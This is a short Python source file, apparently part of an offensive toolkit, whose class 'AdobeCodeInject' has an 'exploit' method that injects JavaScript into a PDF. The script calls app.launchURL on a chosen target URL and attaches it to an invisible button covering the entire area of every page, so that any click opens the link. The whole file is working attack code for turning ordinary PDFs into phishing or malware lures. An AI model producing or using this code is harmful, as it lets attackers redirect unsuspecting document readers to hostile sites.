from core import *
from core.imp import *

class AdobeCodeInject():
    def __init__(self, target_url: str) -> None:
        self.target_url = target_url

    def _make_action(self) -> DictionaryObject:
        js_code = f"""
try {{
    app.launchURL('{self.target_url}', true);
}} catch (e) {{
    app.alert('Error: ' + e.message);
}}
"""
        return DictionaryObject({
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): TextStringObject(js_code),
        })

    def _make_annot(self, rect: RectangleObject, action: IndirectObject) -> DictionaryObject:
        annot = DictionaryObject({
            NameObject("/Type"): NameObject("/Annot"),
            NameObject("/Subtype"): NameObject("/Widget"),
            NameObject("/Rect"): rect,
            NameObject("/FT"): NameObject("/Btn"),
            NameObject("/T"): TextStringObject("Open URL"),
            NameObject("/Ff"): NumberObject(4), 
            NameObject("/A"): action,
        })
        return annot

    def exploit(self, pdf: Pdf):
        action = self._make_action()
        for p in pdf.pages:
            arct = p.artbox
            if not isinstance(arct, RectangleObject):
                arct = p.mediabox
            if not isinstance(arct, RectangleObject):
                arct = p.bleedbox
            print(f"{p.page_number} use arct: {arct}")
            annot = self._make_annot(arct, pdf.add_object(action))
            pdf.add_annotation(p, annot)
